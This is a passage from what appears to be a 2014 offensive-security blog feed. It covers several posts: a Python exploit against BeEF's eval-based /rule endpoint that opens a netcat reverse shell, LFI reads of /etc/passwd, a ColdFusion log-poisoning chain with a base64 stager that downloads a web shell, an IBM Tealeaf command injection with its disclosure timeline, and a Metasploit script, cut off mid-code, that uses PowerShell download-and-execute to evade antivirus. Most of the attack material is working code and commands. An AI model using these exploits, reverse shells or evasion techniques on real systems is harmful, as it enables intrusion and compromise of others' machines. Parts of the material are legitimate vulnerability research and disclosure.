<p>The vulnerability lies in one of the exposed API functions, <code>/rule</code>.  The code for this was as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Adds a new DNS rule
</span><span class='line'>        post '/rule' do
</span><span class='line'>          begin
</span><span class='line'>            body = JSON.parse(request.body.read)
</span><span class='line'>
</span><span class='line'>            pattern = body['pattern']
</span><span class='line'>            type = body['type']
</span><span class='line'>            response = body['response']
</span><span class='line'>
</span><span class='line'>            # Validate required JSON keys
</span><span class='line'>            unless [pattern, type, response].include?(nil)
</span><span class='line'>              # Determine whether 'pattern' is a String or Regexp
</span><span class='line'>              begin
</span><span class='line'>
</span><span class='line'>                pattern_test = eval pattern
</span><span class='line'>                pattern = pattern_test if pattern_test.class == Regexp
</span><span class='line'>   #             end
</span><span class='line'>              rescue =&gt; e;
</span><span class='line'>              end</span></code></pre></td></tr></table></div></figure>


<p>The obvious flaw is the eval on user-provided data.  We can exploit this by POSTing a new DNS rule with a malicious pattern:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import requests
</span><span class='line'>import json
</span><span class='line'>import sys
</span><span class='line'>
</span><span class='line'>def fetch_default(ip):
</span><span class='line'>    url = 'http://%s:3000/api/admin/login' % ip
</span><span class='line'>    headers = { 'Content-Type' : 'application/json; charset=UTF-8' }
</span><span class='line'>    data = { 'username' : 'beef', 'password' : 'beef' }
</span><span class='line'>
</span><span class='line'>    response = requests.post(url, headers=headers, data=json.dumps(data))
</span><span class='line'>    if response.status_code is 200 and json.loads(response.content)['success']:
</span><span class='line'>        return json.loads(response.content)['token']
</span><span class='line'>
</span><span class='line'>try:
</span><span class='line'>    ip = '192.168.1.6'
</span><span class='line'>
</span><span class='line'>    if len(sys.argv) &gt; 1:
</span><span class='line'>        token = sys.argv[1]
</span><span class='line'>    else:
</span><span class='line'>        token = fetch_default(ip)
</span><span class='line'>
</span><span class='line'>    if not token:
</span><span class='line'>        print 'Could not get auth token'
</span><span class='line'>        sys.exit(1)
</span><span class='line'>
</span><span class='line'>    url = 'http://%s:3000/api/dns/rule?token=%s' % (ip, token)
</span><span class='line'>    sploit = '%x(nc 192.168.1.97 4455 -e /bin/bash)'
</span><span class='line'>
</span><span class='line'>    headers = { 'Content-Type' : 'application/json; charset=UTF-8' }
</span><span class='line'>    data = { 'pattern' : sploit,
</span><span class='line'>             'type' : 'A',
</span><span class='line'>             'response' : [ '127.0.0.1' ]
</span><span class='line'>           }
</span><span class='line'>
</span><span class='line'>    response = requests.post(url, headers=headers, data=json.dumps(data))
</span><span class='line'>    print response.status_code
</span><span class='line'>except Exception, e:
</span><span class='line'>    print e
</span></code></pre></td></tr></table></div></figure>


<p>You could execute ruby to grab a shell, but BeEF restricts some of the functions we can use (such as exec or system).</p>

<p>There&rsquo;s also an instance of LFI, this time using the server API.  <code>/api/server/bind</code> allows us to mount files at the root of the BeEF web server.  The path defaults to the current path, but can be traversed out of:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>def run_lfi(ip, token):
</span><span class='line'>    url = 'http://%s:3000/api/server/bind?token=%s' % (ip, token)
</span><span class='line'>    headers = { 'Content-Type' : 'application/json'}
</span><span class='line'>    data = { 'mount' : "/tmp.txt",
</span><span class='line'>             'local_file' : "/../../../etc/passwd"
</span><span class='line'>           }
</span><span class='line'>
</span><span class='line'>    response = requests.post(url, headers=headers, data=json.dumps(data))
</span><span class='line'>    print response.status_code</span></code></pre></td></tr></table></div></figure>


<p>We can then hit our server at /tmp.txt for <code>/etc/passwd</code>.  Though this appears to be intended behavior, and perhaps labeling it an LFI is a misnomer, it is still yet another example of why you should <em>not</em> expose these tools externally with default credentials.  Default credentials are just bad, period.  Stop it.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFI to shell in Coldfusion 6-10]]></title>
    <link href="http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/"/>
    <updated>2014-04-02T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion</id>
    <content type="html"><![CDATA[<p>ColdFusion has <a href="http://www.blackhatlibrary.net/Coldfusion_hacking">several</a> very popular LFI&rsquo;s that are often used to fetch CF hashes, which can then be passed or cracked/reversed.  A lesser use of this LFI, one that I haven&rsquo;t seen documented as of yet, is actually obtaining a shell.  When you can&rsquo;t crack or pass, what&rsquo;s left?</p>

<p>The less-than-obvious solution is to exploit CFML&rsquo;s parser, which acts much in the same way that PHP does when used in HTML.  You can embed PHP into any HTML page, at any location, because of the way the PHP interpreter searches a document for executable code.  This is the foundational basis of log poisoning.  CFML acts in much the same way, and we can use these LFI&rsquo;s to inject CFML and execute it on the remote system.</p>

<p>Let&rsquo;s begin by first identifying the LFI; I&rsquo;ll be using ColdFusion 8 as example.  CF8&rsquo;s LFI lies in the locale parameter:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.219:8500/CFIDE/administrator/enter.cfm?local=../../../../../../../../ColdFusion8\logs\application.log%00en</span></code></pre></td></tr></table></div></figure>


<p>When exploited, this will dump the contents of <code>application.log</code>, a logging file that stores error messages.</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/cf_log.jpg"></p>

<p>We can write to this file by triggering an error, such as attempting to access a nonexistent CFML page.  This log also fails to sanitize data, allowing us to inject any sort of characters we want; including CFML code.</p>

<p>The idea for this is to inject a simple stager payload that will then pull down and store our real payload; in this case, a web shell (something like fuze).  The stager I came up with is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfhttp method='get' url='#ToString(ToBinary('aHR0cDovLzE5Mi4xNjguMS45Nzo4MDAwL2NtZC5jZm1s'))#' path='#ExpandPath(ToString(ToBinary('Li4vLi4v')))#' file='cmd.cfml'&gt;</span></code></pre></td></tr></table></div></figure>


<p>The <code>cfhttp</code> tag is used to execute an HTTP request for our real payload, the URL of which is base64&rsquo;d to avoid some encoding issues with forward slashes.  We then expand the local path to <code>../../</code> which drops us into <code>wwwroot</code>, which is the first directory accessible from the web server.</p>

<p>Once the stager is injected, we only need to exploit the LFI to retrieve the log file and execute our CFML code:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/cf_log_fetch.jpg"></p>

<p>Which we can then access from the root directory:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/cf_log_exec.jpg"></p>

<p>A quick run of this in clusterd:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i 192.168.1.219 -a coldfusion -p8500 -v8 --deployer lfi_stager --deploy ./src/lib/resources/cmd.cfml 
</span><span class='line'>
</span><span class='line'>        clusterd/0.2.1 - clustered attack toolkit
</span><span class='line'>            [Supporting 5 platforms]
</span><span class='line'>
</span><span class='line'> [2014-04-02 11:28PM] Started at 2014-04-02 11:28PM
</span><span class='line'> [2014-04-02 11:28PM] Servers' OS hinted at windows
</span><span class='line'> [2014-04-02 11:28PM] Fingerprinting host '192.168.1.219'
</span><span class='line'> [2014-04-02 11:28PM] Server hinted at 'coldfusion'
</span><span class='line'> [2014-04-02 11:28PM] Checking coldfusion version 8.0 ColdFusion Manager...
</span><span class='line'> [2014-04-02 11:28PM] Matched 1 fingerprints for service coldfusion
</span><span class='line'> [2014-04-02 11:28PM]   ColdFusion Manager (version 8.0)
</span><span class='line'> [2014-04-02 11:28PM] Fingerprinting completed.
</span><span class='line'> [2014-04-02 11:28PM] Injecting stager...
</span><span class='line'> [2014-04-02 11:28PM] Waiting for remote server to download file [7s]]
</span><span class='line'> [2014-04-02 11:28PM] cmd.cfml deployed at /cmd.cfml
</span><span class='line'> [2014-04-02 11:28PM] Finished at 2014-04-02 11:28PM
</span></code></pre></td></tr></table></div></figure>


<p>The downside to this method is remnance in a log file, which cannot be purged unless the CF server is shutdown (except in CF10).  It also means that the CFML file, if using the web shell, will be hanging around the filesystem.  An alternative is to inject a web shell that exists on-demand, that is, check if an argument is provided to the LFI and only parse and execute then.</p>

<p>A working deployer for this can be found in the latest release of clusterd (v0.2.1).  It is also worth noting that this method is applicable to other CFML engines; details on that, and a working proof of concept, in the near future.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[IBM Tealeaf CX (v8 Release 8) Remote OS Command Injection / LFI]]></title>
    <link href="http://hatRiot.github.io/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi/"/>
    <updated>2014-03-26T22:51:11-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi</id>
    <content type="html"><![CDATA[<p>Tealeaf Technologies was <a href="http://techcrunch.com/2012/05/02/ibm-acquires-tealeaf-to-add-customer-buying-analytics-to-smarter-commerce-products/">purchased</a> by IBM in May of 2012, and is a customer buying analytics application.  Essentially, an administrator will configure a Tealeaf server that accepts analytic data from remote servers, which it then generates various models, graphs, reports, etc based on the aggregate of data.
Their analytics status/server monitoring application is vulnerable to a fairly trivial OS command injection vulnerability, as well as local file inclusion.  This vulnerability was discovered on a PCI engagement against a large retailer; the LFI was used to pull PHP files and hunt for RCE.</p>

<p>The entire application is served up by default on port 8080 and is developed in PHP.  Authentication by default is disabled, however, support for Basic Auth appears to exist.  This interface allows administrators access to statistics, logs, participating servers, and more.  Contained therein is the ability to obtain application logs, such as configuration, maintenance, access, and more.  The log parameter is vulnerable to LFI:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if(array_key_exists("log", $params))
</span><span class='line'>$path = $config-&gt;logfiledir() . "/" . $params["log"];
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>$file = basename($path);
</span><span class='line'>$size = filesize($path);
</span><span class='line'>
</span><span class='line'>// Set the cache-control and expiration date so that the file expires
</span><span class='line'>// immediately after download.
</span><span class='line'>//
</span><span class='line'>$rfc1123date = gmdate('D, d M Y H:i:s T', 1);
</span><span class='line'>header('Cache-Control: max-age=0, must-revalidate, post-check=0, pre-check=0');
</span><span class='line'>header("Expires: " . $rfc1123date);
</span><span class='line'>
</span><span class='line'>header("Content-Type: application/octet-stream");
</span><span class='line'>header("Content-Disposition: attachment; filename=$file;");
</span><span class='line'>header("Content-Length: $size;");
</span><span class='line'>
</span><span class='line'>readfile($path);</span></code></pre></td></tr></table></div></figure>


<p>The URL then is <code>http://host:8080/download.php?log=../../../etc/passwd</code></p>

<p>Tealeaf also suffers from a rather trivial remote OS command injection vulnerability.  Under the Delivery tab, there exists the option to ping remote servers that send data back to the mothership.  Do you see where this is going?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if ($_POST["perform_action"] == "testconn") {
</span><span class='line'>    $host = $_POST["testconn_host"];
</span><span class='line'>    $port = $_POST["testconn_port"];
</span><span class='line'>    $use_t = strtolower($_POST["testconn_t"]) == "true" ? true : false;
</span><span class='line'>    $command = $GLOBALS["config"]-&gt;testconn_program() . ' ';
</span><span class='line'>    if($use_t)
</span><span class='line'>    $output = trim(shell_command_output($command . $host . " -p " . $port . " -t"));
</span><span class='line'>    else
</span><span class='line'>    $output = trim(shell_command_output($command . $host . " -p " . $port));
</span><span class='line'>
</span><span class='line'>    if($output != "") {
</span><span class='line'>        $alert_function = "alert('" . str_replace("\n", "\\n",
</span><span class='line'>        htmlentities($output, ENT_QUOTES)) . "')";
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    $_SESSION['delivery']-&gt;pending_changes = $orig_pending_changes;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>And shell_command_output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function shell_command_output($command) {
</span><span class='line'>    $result = `$command 2&gt;&1`;
</span><span class='line'>    if (strlen($result) &gt; 0)
</span><span class='line'>    return $result;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Harnessing the <code>$host</code> variable, we can inject arbitrary commands to run under the context of the process user, which by default is <code>ctccap</code>.  In order to exploit this without hanging processes or goofing up flow, I injected the following as the host variable: <code>8.8.8.8 -c 1 ; whoami ; ping 8.8.8.8 -c 1</code>.</p>

<h3>Timeline</h3>


<ul>
<li>11/08/2013: IBM vulnerability submitted</li>
<li>11/09/2013: IBM acknowledge vulnerability and assign internal advisory ID</li>
<li>12/05/2013: Request for status update</li>
<li>01/06/2014: Second request for status update</li>
<li>01/23/2014: IBM responds with a target patch date set for &ldquo;another few months&rdquo;</li>
<li>03/26/2014: IBM posts advisory, assigns CVE-2013-6719 and CVE-2013-6720</li>
</ul>


<p><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21667630">Advisory</a><br/>
<a href="http://www.exploit-db.com/exploits/32546/">exploit-db PoC</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[meterpreter shell upgrades using powershell]]></title>
    <link href="http://hatRiot.github.io/blog/2014/03/10/meterpreter-shell-upgrades-using-powershell/"/>
    <updated>2014-03-10T21:31:47-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/03/10/meterpreter-shell-upgrades-using-powershell</id>
    <content type="html"><![CDATA[<p>One of my primary goals during development of <a href="https://github.com/hatRiot/clusterd">clusterd</a> was ensuring reliability and covertness during remote deploys.  It&rsquo;s no secret that antivirus routinely eats vanilla meterpreter shells.  For this, the <code>--gen-payload</code> flag generates a war file with <code>java/jsp_shell_reverse_tcp</code> tucked inside.  This is used due to it being largely undetected by AV, and our environments are perfectly suited for it.  However, Meterpreter is a fantastic piece of software, and it&rsquo;d be nice to be able to elevate from this simple JSP shell into it.</p>

<p>Metasploit has a solution for this, sort of.  <code>sessions -u</code> can be used to upgrade an existing shell session into a full-blown Meterpreter.  Unfortunately, the current implementation uses <code>Rex::Exploitation::CmdStagerVBS</code>, which writes the executable to disk and executes it.  This is almost always immediately popped by most enterprise-grade (and even most consumer grade) AV&rsquo;s.  For this, we need a new solution.</p>

<p>The easiest solution is Powershell; this allows us to execute shellcode completely in-memory, without ever bouncing files against disk.  I used Obscure Security&rsquo;s canonical <a href="http://obscuresecurity.blogspot.com/2013/03/powersploit-metasploit-shells.html">post</a> on it for my implementation.  The only problem really is portability, as Powershell doesn&rsquo;t exist on Windows XP.  This could be mitigated by patching in shellcode via Java, but that&rsquo;s another post for another time.</p>

<p>Right, so how&rsquo;s this work?  We essentially execute a Powershell command in the running session (our generic shell) that fetches a payload from a remote server and executes it.  Our payload in this case is <a href="https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1">Invoke-Shellcode</a>, from the PowerSploit package.  This bit of code will generate our reverse HTTPS meterpreter shell and inject it into the current process ID.  Our command looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc %s"</span></code></pre></td></tr></table></div></figure>


<p>Our encoded payload is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>iex (New-Object Net.WebClient).DownloadString('http://%s:%s/')</span></code></pre></td></tr></table></div></figure>


<p>IEX, or Invoke-Expression, is just an eval operation.  In this case, we&rsquo;re fetching a URL and executing it.  This is a totally transparent, completely in-memory solution.  Let&rsquo;s have a look at it running:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; sessions -l
</span><span class='line'>
</span><span class='line'>Active sessions
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>  Id  Type         Information                                                                       Connection
</span><span class='line'>  --  ----         -----------                                                                       ----------
</span><span class='line'>  1   shell linux  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  192.168.1.6:4444 -&gt; 192.168.1.102:60911 (192.168.1.102)
</span><span class='line'>
</span><span class='line'>msf exploit(handler) &gt; </span></code></pre></td></tr></table></div></figure>


<p>We see above that we currently have a generic shell (it&rsquo;s the java/jsp_shell_reverse_tcp payload) on a Windows 7 system (which happens to be running MSE).  Using this new script, we can upgrade this session to Meterpreter:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; sessions -u 1
</span><span class='line'>
</span><span class='line'>[*] Started HTTPS reverse handler on https://0.0.0.0:53568/
</span><span class='line'>[*] Starting the payload handler...
</span><span class='line'>[*] 192.168.1.102:60922 Request received for /INITM...
</span><span class='line'>[*] 192.168.1.102:60922 Staging connection for target /INITM received...
</span><span class='line'>[*] Patched user-agent at offset 663128...
</span><span class='line'>[*] Patched transport at offset 662792...
</span><span class='line'>[*] Patched URL at offset 662856...
</span><span class='line'>[*] Patched Expiration Timeout at offset 663728...
</span><span class='line'>[*] Patched Communication Timeout at offset 663732...
</span><span class='line'>[*] Meterpreter session 2 opened (192.168.1.6:53568 -&gt; 192.168.1.102:60922) at 2014-03-11 23:09:36 -0600
</span><span class='line'>msf exploit(handler) &gt; sessions -i 2
</span><span class='line'>[*] Starting interaction with 2...
</span><span class='line'>
</span><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer        : BRYAN-PC
</span><span class='line'>OS              : Windows 7 (Build 7601, Service Pack 1).
</span><span class='line'>Architecture    : x64 (Current Process is WOW64)
</span><span class='line'>System Language : en_US
</span><span class='line'>Meterpreter     : x86/win32
</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>


<p>And just like that, without a peep from MSE, we&rsquo;ve got a Meterpreter shell.</p>

<p>You can find the code for this implementation below, though be warned; this is PoC quality code, and probably even worse as I&rsquo;m not really a Ruby developer.  Meatballs over at Metasploit has a few awesome Powershell pull requests waiting for a merge.  Once this is done, I can implement that here and submit a proper implementation.  If you&rsquo;d like to try this out, simply create a backup copy of <code>scripts/shell/spawn_meterpreter.rb</code> and copy in the following, then <code>reload</code>.  You should be upgradin&#8217; and bypassin&#8217; in no time.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#
</span><span class='line'># Session upgrade using Powershell IEX
</span><span class='line'># 
</span><span class='line'># Some code stolen from jduck's original implementation
</span><span class='line'>#
</span><span class='line'># -drone
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'>class HTTPServer
</span><span class='line'>    #
</span><span class='line'>    # Using Ruby HTTPServer here since this isn't a module, and I can't figure
</span><span class='line'>    # out how to use MSF libs in here
</span><span class='line'>    #
</span><span class='line'>    @sent = false
</span><span class='line'>    def state
</span><span class='line'>        return @sent
</span><span class='line'>    end
</span><span class='line'>
</span><span class='line'>    def initialize(port, body)
</span><span class='line'>        require 'socket'
</span><span class='line'>
</span><span class='line'>        @sent = false
</span><span class='line'>        @server = Thread.new do
</span><span class='line'>            server = TCPServer.open port
</span><span class='line'>            loop do
</span><span class='line'>                client = server.accept
</span><span class='line'>                content_type = "text/plain"
</span><span class='line'>                client.puts "HTTP/1.0 200 OK\r\nContent-type: #{content_type}"\
</span><span class='line'>                            "\r\nContent-Length: #{body.length}\r\n\r\n#{body}"\
</span><span class='line'>                            "\r\n\r\n"
</span><span class='line'>                sleep 5
</span><span class='line'>                client.close
